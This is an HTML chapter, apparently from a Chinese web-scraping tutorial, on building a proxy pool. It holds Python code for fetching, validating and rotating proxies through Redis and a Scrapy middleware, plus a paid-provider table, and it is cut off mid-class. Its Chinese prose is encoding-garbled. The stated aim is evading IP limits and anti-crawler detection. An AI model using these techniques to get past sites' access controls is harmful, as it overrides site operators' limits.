        <li><a href="#06-Engineering-docker-deployment">Docker éƒ¨ç½²</a> - å®¹å™¨åŒ–éƒ¨ç½²åˆ†å¸ƒå¼çˆ¬è™«</li>
        <li><a href="#06-Engineering-monitoring-and-alerting">ç›‘æ§å’Œå‘Šè­¦</a> - çˆ¬è™«ç³»ç»Ÿç›‘æ§</li>
      </ul>

    </div>

    <div class="section" id="06-Engineering-proxy-pool-management">
      <h2>52. Proxy Pool Management</h2>
      <h1 id="ä»£ç†æ± ç®¡ç†">ä»£ç†æ± ç®¡ç†</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>ä»£ç†æ± æ˜¯åˆ†å¸ƒå¼çˆ¬è™«çš„æ ¸å¿ƒç»„ä»¶ä¹‹ä¸€ï¼Œç”¨äºçªç ´ IP é™åˆ¶å’Œåçˆ¬è™«æ£€æµ‹ã€‚æœ¬ç« ä»‹ç»ä»£ç†æ± çš„æ„å»ºã€ç®¡ç†å’Œä¼˜åŒ–ç­–ç•¥ã€‚</p>

      <hr />

      <h2 id="ä»£ç†ç±»å‹">ä»£ç†ç±»å‹</h2>

      <h3 id="1-httphttps-ä»£ç†">1. HTTP/HTTPS ä»£ç†</h3>

      <p>æœ€å¸¸è§çš„ä»£ç†ç±»å‹ã€‚</p>

      <div class="codehilite">
        <pre><span></span><code><span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="s1">&#39;http://proxy_ip:port&#39;</span><span class="p">,</span>
    <span class="s1">&#39;https&#39;</span><span class="p">:</span> <span class="s1">&#39;https://proxy_ip:port&#39;</span>
<span class="p">}</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="2-socks-ä»£ç†">2. SOCKS ä»£ç†</h3>

      <p>æ”¯æŒæ›´å¤šåè®®ï¼Œæ€§èƒ½æ›´å¥½ã€‚</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># éœ€è¦å®‰è£… requests[socks]</span>
<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="s1">&#39;socks5://proxy_ip:port&#39;</span><span class="p">,</span>
    <span class="s1">&#39;https&#39;</span><span class="p">:</span> <span class="s1">&#39;socks5://proxy_ip:port&#39;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="3-ä»£ç†åˆ†ç±»">3. ä»£ç†åˆ†ç±»</h3>

      <p><strong>æŒ‰åŒ¿åæ€§</strong>:</p>

      <ul>
        <li><strong>é€æ˜ä»£ç†</strong>: ç›®æ ‡æœåŠ¡å™¨èƒ½çœ‹åˆ°çœŸå® IP</li>
        <li><strong>åŒ¿åä»£ç†</strong>: éšè—çœŸå® IPï¼Œä½†æš´éœ²ä»£ç†ç‰¹å¾</li>
        <li><strong>é«˜åŒ¿ä»£ç†</strong>: å®Œå…¨éšè—ï¼Œæ— ä»£ç†ç‰¹å¾</li>
      </ul>

      <p><strong>æŒ‰æ¥æº</strong>:</p>

      <ul>
        <li><strong>å…è´¹ä»£ç†</strong>: ä¸ç¨³å®šï¼Œé€Ÿåº¦æ…¢</li>
        <li><strong>ä»˜è´¹ä»£ç†</strong>: ç¨³å®šï¼Œé€Ÿåº¦å¿«</li>
        <li><strong>ä½å®…ä»£ç†</strong>: çœŸå®å®¶åº­ IPï¼Œè´¨é‡æœ€é«˜</li>
      </ul>

      <hr />

      <h2 id="ä»£ç†æ± æ¶æ„">ä»£ç†æ± æ¶æ„</h2>

      <pre><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚        Proxy Fetcher             â”‚
â”‚  - ä»å¤šä¸ªæºè·å–ä»£ç†               â”‚
â”‚  - å…è´¹ä»£ç†ç½‘ç«™                   â”‚
â”‚  - ä»˜è´¹ä»£ç† API                   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚
           â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚       Proxy Validator            â”‚
â”‚  - éªŒè¯ä»£ç†æœ‰æ•ˆæ€§                 â”‚
â”‚  - æµ‹è¯•å“åº”æ—¶é—´                   â”‚
â”‚  - æ£€æŸ¥åŒ¿åæ€§                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚
           â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚        Redis Storage             â”‚
â”‚  - å¯ç”¨ä»£ç†æ±                      â”‚
â”‚  - ä»£ç†è¯„åˆ†                       â”‚
â”‚  - ä½¿ç”¨ç»Ÿè®¡                       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚
           â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚       Proxy Scheduler            â”‚
â”‚  - æ™ºèƒ½åˆ†é…ä»£ç†                   â”‚
â”‚  - å¤±è´¥é‡è¯•                       â”‚
â”‚  - åŠ¨æ€è°ƒæ•´                       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>

      <hr />

      <h2 id="å®Œæ•´å®ç°">å®Œæ•´å®ç°</h2>

      <h3 id="ä»£ç†æ± ç±»">ä»£ç†æ± ç±»</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">redis</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">typing</span><span class="w"> </span><span class="kn">import</span> <span class="n">List</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">logging</span>

<span class="n">logging</span><span class="o">.</span><span class="n">basicConfig</span><span class="p">(</span><span class="n">level</span><span class="o">=</span><span class="n">logging</span><span class="o">.</span><span class="n">INFO</span><span class="p">)</span>
<span class="n">logger</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>

<span class="k">class</span><span class="w"> </span><span class="nc">ProxyPool</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">r</span> <span class="o">=</span> <span class="n">redis</span><span class="o">.</span><span class="n">Redis</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">6379</span><span class="p">,</span> <span class="n">decode_responses</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">test_url</span> <span class="o">=</span> <span class="s1">&#39;http://httpbin.org/ip&#39;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mi">5</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">fetch_proxies</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">str</span><span class="p">]:</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä»å¤šä¸ªæºè·å–ä»£ç†&quot;&quot;&quot;</span>
        <span class="n">proxies</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="n">proxies</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_fetch_from_free_proxy</span><span class="p">())</span>
        <span class="n">proxies</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_fetch_from_paid_api</span><span class="p">())</span>
        <span class="k">return</span> <span class="nb">list</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="n">proxies</span><span class="p">))</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">_fetch_from_free_proxy</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">str</span><span class="p">]:</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä»å…è´¹ä»£ç†ç½‘ç«™è·å–&quot;&quot;&quot;</span>
        <span class="n">proxies</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://www.kuaidaili.com/free/&#39;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
            <span class="c1"># è§£æé¡µé¢ï¼Œæå–ä»£ç†</span>
        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="n">logger</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Fetch free proxy failed: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">proxies</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">_fetch_from_paid_api</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">str</span><span class="p">]:</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä»ä»˜è´¹ API è·å–&quot;&quot;&quot;</span>
        <span class="n">proxies</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://api.proxy.com/get?num=100&#39;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
            <span class="n">proxies</span> <span class="o">=</span> <span class="p">[</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">item</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">item</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span> <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">data</span><span class="p">]</span>
        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="n">logger</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Fetch paid proxy failed: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">proxies</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">validate_proxy</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">proxy</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;éªŒè¯ä»£ç†å¯ç”¨æ€§&quot;&quot;&quot;</span>
        <span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;http://</span><span class="si">{</span><span class="n">proxy</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span>
            <span class="s1">&#39;https&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;http://</span><span class="si">{</span><span class="n">proxy</span><span class="si">}</span><span class="s1">&#39;</span>
        <span class="p">}</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
            <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">test_url</span><span class="p">,</span>
                <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">,</span>
                <span class="n">timeout</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">timeout</span>
            <span class="p">)</span>
            <span class="n">response_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start_time</span>

            <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">zadd</span><span class="p">(</span><span class="s1">&#39;proxy_pool&#39;</span><span class="p">,</span> <span class="p">{</span><span class="n">proxy</span><span class="p">:</span> <span class="n">response_time</span><span class="p">})</span>
                <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Valid proxy: </span><span class="si">{</span><span class="n">proxy</span><span class="si">}</span><span class="s1"> (</span><span class="si">{</span><span class="n">response_time</span><span class="si">:</span><span class="s1">.2f</span><span class="si">}</span><span class="s1">s)&#39;</span><span class="p">)</span>
                <span class="k">return</span> <span class="kc">True</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="k">pass</span>
        <span class="k">return</span> <span class="kc">False</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">batch_validate</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">proxies</span><span class="p">:</span> <span class="n">List</span><span class="p">[</span><span class="nb">str</span><span class="p">]):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ‰¹é‡éªŒè¯ä»£ç†&quot;&quot;&quot;</span>
        <span class="kn">from</span><span class="w"> </span><span class="nn">concurrent.futures</span><span class="w"> </span><span class="kn">import</span> <span class="n">ThreadPoolExecutor</span>
        <span class="k">with</span> <span class="n">ThreadPoolExecutor</span><span class="p">(</span><span class="n">max_workers</span><span class="o">=</span><span class="mi">50</span><span class="p">)</span> <span class="k">as</span> <span class="n">executor</span><span class="p">:</span>
            <span class="n">executor</span><span class="o">.</span><span class="n">map</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">validate_proxy</span><span class="p">,</span> <span class="n">proxies</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_proxy</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–æœ€å¿«çš„ä»£ç†&quot;&quot;&quot;</span>
        <span class="n">result</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">zrange</span><span class="p">(</span><span class="s1">&#39;proxy_pool&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">result</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">result</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
        <span class="k">return</span> <span class="kc">None</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_random_proxy</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;éšæœºè·å–ä»£ç†&quot;&quot;&quot;</span>
        <span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
        <span class="n">proxies</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">zrange</span><span class="p">(</span><span class="s1">&#39;proxy_pool&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">proxies</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">proxies</span><span class="p">)</span>
        <span class="k">return</span> <span class="kc">None</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">remove_proxy</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">proxy</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ç§»é™¤å¤±æ•ˆä»£ç†&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">zrem</span><span class="p">(</span><span class="s1">&#39;proxy_pool&#39;</span><span class="p">,</span> <span class="n">proxy</span><span class="p">)</span>
        <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Removed proxy: </span><span class="si">{</span><span class="n">proxy</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_pool_size</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–ä»£ç†æ± å¤§å°&quot;&quot;&quot;</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">zcard</span><span class="p">(</span><span class="s1">&#39;proxy_pool&#39;</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è¿è¡Œä»£ç†æ± &quot;&quot;&quot;</span>
        <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Starting proxy pool...&#39;</span><span class="p">)</span>
        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
            <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Fetching proxies...&#39;</span><span class="p">)</span>
            <span class="n">proxies</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">fetch_proxies</span><span class="p">()</span>
            <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Fetched </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">proxies</span><span class="p">)</span><span class="si">}</span><span class="s1"> proxies&#39;</span><span class="p">)</span>

            <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Validating proxies...&#39;</span><span class="p">)</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">batch_validate</span><span class="p">(</span><span class="n">proxies</span><span class="p">)</span>

            <span class="bp">self</span><span class="o">.</span><span class="n">cleanup_old_proxies</span><span class="p">()</span>

            <span class="n">pool_size</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_pool_size</span><span class="p">()</span>
            <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Current pool size: </span><span class="si">{</span><span class="n">pool_size</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>

            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">cleanup_old_proxies</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ¸…ç†å“åº”æ—¶é—´è¿‡é•¿çš„ä»£ç†&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">zremrangebyscore</span><span class="p">(</span><span class="s1">&#39;proxy_pool&#39;</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="nb">float</span><span class="p">(</span><span class="s1">&#39;inf&#39;</span><span class="p">))</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ä½¿ç”¨ä»£ç†æ± ">ä½¿ç”¨ä»£ç†æ± </h2>

      <h3 id="åŸºæœ¬ä½¿ç”¨">åŸºæœ¬ä½¿ç”¨</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">crawl_with_proxy</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ä½¿ç”¨ä»£ç†çˆ¬å–&quot;&quot;&quot;</span>
    <span class="n">pool</span> <span class="o">=</span> <span class="n">ProxyPool</span><span class="p">()</span>
    <span class="n">max_retries</span> <span class="o">=</span> <span class="mi">3</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">max_retries</span><span class="p">):</span>
        <span class="n">proxy</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="n">get_proxy</span><span class="p">()</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">proxy</span><span class="p">:</span>
            <span class="n">logger</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="s1">&#39;No available proxy!&#39;</span><span class="p">)</span>
            <span class="k">break</span>

        <span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;http://</span><span class="si">{</span><span class="n">proxy</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span>
            <span class="s1">&#39;https&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;http://</span><span class="si">{</span><span class="n">proxy</span><span class="si">}</span><span class="s1">&#39;</span>
        <span class="p">}</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
            <span class="k">return</span> <span class="n">response</span>
        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="n">logger</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Proxy </span><span class="si">{</span><span class="n">proxy</span><span class="si">}</span><span class="s1"> failed: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
            <span class="n">pool</span><span class="o">.</span><span class="n">remove_proxy</span><span class="p">(</span><span class="n">proxy</span><span class="p">)</span>

    <span class="k">return</span> <span class="kc">None</span>
</code></pre>
      </div>

      <h3 id="ä¸-scrapy-é›†æˆ">ä¸ Scrapy é›†æˆ</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># middlewares.py</span>
<span class="k">class</span><span class="w"> </span><span class="nc">ProxyMiddleware</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">pool</span> <span class="o">=</span> <span class="n">ProxyPool</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">process_request</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä¸ºè¯·æ±‚è®¾ç½®ä»£ç†&quot;&quot;&quot;</span>
        <span class="n">proxy</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">pool</span><span class="o">.</span><span class="n">get_proxy</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">proxy</span><span class="p">:</span>
            <span class="n">request</span><span class="o">.</span><span class="n">meta</span><span class="p">[</span><span class="s1">&#39;proxy&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;http://</span><span class="si">{</span><span class="n">proxy</span><span class="si">}</span><span class="s1">&#39;</span>
            <span class="n">spider</span><span class="o">.</span><span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Using proxy: </span><span class="si">{</span><span class="n">proxy</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">process_exception</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">exception</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å¤„ç†ä»£ç†å¤±è´¥&quot;&quot;&quot;</span>
        <span class="n">proxy</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">meta</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;proxy&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;http://&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">proxy</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">pool</span><span class="o">.</span><span class="n">remove_proxy</span><span class="p">(</span><span class="n">proxy</span><span class="p">)</span>
            <span class="n">spider</span><span class="o">.</span><span class="n">logger</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Removed failed proxy: </span><span class="si">{</span><span class="n">proxy</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ä»˜è´¹ä»£ç†æœåŠ¡">ä»˜è´¹ä»£ç†æœåŠ¡</h2>

      <h3 id="æ¨èæœåŠ¡å•†">æ¨èæœåŠ¡å•†</h3>

      <table>
        <thead>
          <tr>
            <th>æœåŠ¡å•†</th>
            <th>ç±»å‹</th>
            <th>ä»·æ ¼</th>
            <th>ç‰¹ç‚¹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>Luminati (Bright Data)</strong></td>
            <td>ä½å®…ä»£ç†</td>
            <td>$500+/æœˆ</td>
            <td>è´¨é‡æœ€é«˜ï¼ŒIP æ± æœ€å¤§</td>
          </tr>
          <tr>
            <td><strong>Smartproxy</strong></td>
            <td>ä½å®…ä»£ç†</td>
            <td>$75+/æœˆ</td>
            <td>æ€§ä»·æ¯”é«˜</td>
          </tr>
          <tr>
            <td><strong>Oxylabs</strong></td>
            <td>æ•°æ®ä¸­å¿ƒ + ä½å®…</td>
            <td>$300+/æœˆ</td>
            <td>ç¨³å®šå¯é </td>
          </tr>
          <tr>
            <td><strong>ProxyMesh</strong></td>
            <td>æ•°æ®ä¸­å¿ƒ</td>
            <td>$10+/æœˆ</td>
            <td>ä¾¿å®œå…¥é—¨</td>
          </tr>
          <tr>
            <td><strong>ç«™å¤§çˆ·</strong></td>
            <td>æ•°æ®ä¸­å¿ƒ</td>
            <td>Â¥100+/æœˆ</td>
            <td>å›½å†…æœåŠ¡</td>
          </tr>
        </tbody>
      </table>

      <h3 id="api-é›†æˆç¤ºä¾‹">API é›†æˆç¤ºä¾‹</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="k">class</span><span class="w"> </span><span class="nc">LuminatiProxy</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">22225</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">username</span> <span class="o">=</span> <span class="n">username</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">password</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;zproxy.lum-superproxy.io&#39;</span>
